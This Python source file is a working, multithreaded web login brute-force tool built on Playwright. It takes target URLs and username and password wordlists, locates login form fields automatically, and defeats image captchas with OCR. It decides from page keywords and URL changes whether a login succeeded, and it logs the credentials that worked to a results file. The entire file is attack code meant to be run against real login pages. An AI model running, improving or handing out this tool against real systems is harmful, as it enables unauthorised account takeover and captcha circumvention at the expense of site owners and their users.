from playwright.sync_api import sync_playwright
import config
from utils import logger, load_file, get_ocr_result
import queue
from concurrent.futures import ThreadPoolExecutor
import os
from datetime import datetime

STOP_FLAG = False

def safe_fill(element, value):
    try:
        element.wait_for(state="visible", timeout=2000)
        element.fill("")
        element.fill(value)
        return True
    except Exception:
        return False

def get_captcha_code(page, captcha_img):
    try:
        if not captcha_img.is_visible():
            captcha_img.scroll_into_view_if_needed(timeout=1000)
        if not captcha_img.is_visible():
            return ""
        captcha_bytes = captcha_img.screenshot(timeout=2000)
        return get_ocr_result(captcha_bytes)
    except Exception as e:
        logger.warning(f"Get captcha failed: {e}")
        return ""

def find_login_elements(page):
    import time
    user_input = None
    pass_input = None
    login_btn = None
    for _ in range(3):
        for selector in ["input[type='text']", "input[type='email']", "input[name*='user']", "input[id*='user']"]:
            if page.locator(selector).count() > 0:
                user_input = page.locator(selector).first
                break
        if page.locator("input[type='password']").count() > 0:
            pass_input = page.locator("input[type='password']").first
        for selector in ["button[type='submit']", "input[type='submit']", "button:has-text('Login')", "button:has-text('登录')"]:
            if page.locator(selector).count() > 0:
                login_btn = page.locator(selector).first
                break
        if user_input and pass_input and login_btn:
            return user_input, pass_input, login_btn
        time.sleep(1)
    return None, None, None

def crack_worker(url_queue, usernames, passwords, results):
    global STOP_FLAG
    if STOP_FLAG:
        return
    logger.info(f"[Worker Start] Launching browser (Headless={config.HEADLESS})...")
    with sync_playwright() as p:
        try:
            browser = p.chromium.launch(headless=config.HEADLESS)
            while not STOP_FLAG:
                try:
                    url = url_queue.get_nowait()
                except queue.Empty:
                    break
                logger.info(f"[Processing] Start: {url}")
                context = browser.new_context(ignore_https_errors=True)
                page = context.new_page()
                page.set_default_timeout(30000)
                try:
                    _process_single_url(page, context, url, usernames, passwords, results)
                except Exception as e:
                    logger.error(f"[{url}] Processing error: {e}")
                finally:
                    context.close()
                    url_queue.task_done()
        except Exception as e:
            logger.error(f"[Worker Error] Browser process error: {e}")
        finally:
            try:
                browser.close()
            except:
                pass
            logger.info("[Worker End] Browser closed")

def _process_single_url(page, context, url, usernames, passwords, results):
    global STOP_FLAG
    try:
        if STOP_FLAG:
            return
        page.goto(url)
        page.wait_for_load_state("networkidle")
    except Exception as e:
        logger.warning(f"Page load timeout or failed {url}: {e}")
        return
    user_input, pass_input, login_btn = find_login_elements(page)
    if not user_input or not pass_input or not login_btn:
        logger.warning(f"Cannot locate login elements, skipping: {url}")
        return
    captcha_img = None
    captcha_input = None
    try:
        images = page.locator("img").all()
        for img in images:
            src = img.get_attribute("src") or ""
            id_ = img.get_attribute("id") or ""
            class_ = img.get_attribute("class") or ""
            alt = img.get_attribute("alt") or ""
            keywords = ["captcha", "code", "verify", "check", "random", "yzm"]
            if any(k in src.lower() for k in keywords) or \
               any(k in id_.lower() for k in keywords) or \
               any(k in class_.lower() for k in keywords) or \
               any(k in alt.lower() for k in keywords):
                captcha_img = img
                logger.info(f"[{url}] Found captcha image: src={src[:50]}...")
                break
    except Exception as e:
        logger.warning(f"[{url}] Error finding captcha: {e}")
    if captcha_img:
        logger.info(f"[{url}] Captcha detected, trying to locate input...")
        input_selectors = [
            "input[name*='captcha']", "input[id*='captcha']", "input[class*='captcha']",
            "input[name*='code']", "input[id*='code']", "input[class*='code']",
            "input[name*='verify']", "input[id*='verify']", "input[class*='verify']",
            "input[name*='check']", "input[id*='check']",
            "input[name*='yzm']", "input[id*='yzm']",
            "input[placeholder*='验证码']", "input[placeholder*='code']"
        ]
        for selector in input_selectors:
            if page.locator(selector).count() > 0:
                captcha_input = page.locator(selector).first
                logger.info(f"[{url}] Found captcha input: {selector}")
                break
    found = False
    for user in usernames:
        if found and config.STOP_ON_SUCCESS:
            break
        if STOP_FLAG:
            break
        for i, pwd in enumerate(passwords):
            if STOP_FLAG:
                break
            try:
                logger.info(f"[{url}] Trying: {user}:{pwd} ({i+1}/{len(passwords)})")
                is_login_page = "login" in page.url.lower() or page.locator("input[type='password']").count() > 0
                if not is_login_page:
                    logger.debug(f"[{url}] Not on login page, trying to reset...")
                    page.goto(url)
                    page.wait_for_load_state("networkidle")
                    user_input, pass_input, login_btn = find_login_elements(page)
                if not user_input or not pass_input or not login_btn:
                    user_input, pass_input, login_btn = find_login_elements(page)
                if not user_input or not pass_input:
                    logger.error(f"[{url}] Cannot locate inputs, skipping this password")
                    continue
                if not safe_fill(user_input, user):
                    logger.warning(f"[{url}] Input not available, trying to refresh...")
                    page.goto(url)
                    page.wait_for_load_state("networkidle")
                    user_input, pass_input, login_btn = find_login_elements(page)
                    if not user_input or not safe_fill(user_input, user):
                        continue
                if not safe_fill(pass_input, pwd):
                    page.goto(url)
                    page.wait_for_load_state("networkidle")
                    user_input, pass_input, login_btn = find_login_elements(page)
                    safe_fill(user_input, user)
                    if not safe_fill(pass_input, pwd):
                        continue
                if captcha_img and captcha_input:
                    code = get_captcha_code(page, captcha_img)
                    if code:
                        logger.info(f"[{url}] Fill captcha: {code}")
                        safe_fill(captcha_input, code)
                    else:
                        logger.warning(f"[{url}] OCR result empty, try refresh...")
                        try:
                            captcha_img.click(timeout=1000)
                            page.wait_for_timeout(500)
                            code = get_captcha_code(page, captcha_img)
                            if code:
                                logger.info(f"[{url}] After refresh fill captcha: {code}")
                                safe_fill(captcha_input, code)
                        except:
                            pass
                try:
                    login_btn.click(timeout=3000)
                except:
                    page.evaluate("arguments[0].click();", login_btn.element_handle())
                page.wait_for_timeout(3000)
                current_url = page.url
                has_password_field = page.locator("input[type='password']").count() > 0
                page_content = page.content().lower()
                has_error = any(k.lower() in page_content for k in config.ERROR_KEYWORDS) and len(page_content) < 5000
                has_success_keyword = any(k.lower() in page_content for k in config.SUCCESS_KEYWORDS)
                is_url_changed = current_url != url and "login" not in current_url.lower()
                if (has_success_keyword and not has_error) or (is_url_changed and not has_password_field and not has_error):
                    if "error" in current_url.lower() or "fail" in current_url.lower():
                        logger.info(f"[{url}] URL contains error keyword, judged as failed")
                    else:
                        result = {
                            "url": url,
                            "username": user,
                            "password": pwd,
                            "timestamp": datetime.now().isoformat()
                        }
                        results.append(result)
                        logger.info(f"[SUCCESS] Simulated login success: {url} -> {user}:{pwd}")
                        with open(config.RESULTS_FILE, "a", encoding="utf-8") as f:
                            f.write(f"{url} | {user}:{pwd}\n")
                        if config.STOP_ON_SUCCESS:
                            found = True
                            break
                elif has_error:
                    logger.info(f"[{url}] Page contains error keyword, judged as failed")
                if not is_url_changed or has_error:
                    logger.debug(f"[{url}] Login failed, reset state...")
                    try:
                        context.clear_cookies()
                        page.goto(url)
                        page.wait_for_load_state("networkidle")
                        user_input, pass_input, login_btn = find_login_elements(page)
                    except Exception as e:
                        logger.error(f"[{url}] Reset failed: {e}")
                        user_input = None
                    if not user_input:
                        continue
            except Exception as e:
                logger.error(f"[{url}] Crack process error: {e}")
                try:
                    page.goto(url)
                    page.wait_for_load_state("networkidle")
                except:
                    pass

def run_complex_crack(targets=None, usernames=None, passwords=None):
    global STOP_FLAG
    logger.info(f"Starting complex mode crack (ThreadPool={config.THREADS}, Headless={config.HEADLESS})...")
    if targets is None:
        if config.FORCE_COMPLEX_MODE:
            targets = load_file(config.URL_LIST_FILE)
        else:
            targets = load_file(config.COMPLEX_LIST_FILE)
            if not targets:
                targets = load_file(config.URL_LIST_FILE)
    if not targets:
        logger.warning("No target URLs available, skipping.")
        return []
    if usernames is None:
        usernames = load_file(config.USERNAME_FILE) or config.DEFAULT_USERNAMES
    if passwords is None:
        passwords = load_file(config.PASSWORD_FILE) or config.DEFAULT_PASSWORDS
    url_queue = queue.Queue()
    for url in targets:
        url_queue.put(url)
    results = []
    executor = ThreadPoolExecutor(max_workers=config.THREADS)
    futures = []
    try:
        for _ in range(config.THREADS):
            futures.append(executor.submit(crack_worker, url_queue, usernames, passwords, results))
        executor.shutdown(wait=True)
    except KeyboardInterrupt:
        logger.warning("\n!!! User interrupted (Ctrl+C) !!!")
        STOP_FLAG = True
        executor.shutdown(wait=False)
        logger.warning("Stop signal sent.")
    return results

if __name__ == '__main__':
    run_complex_crack()
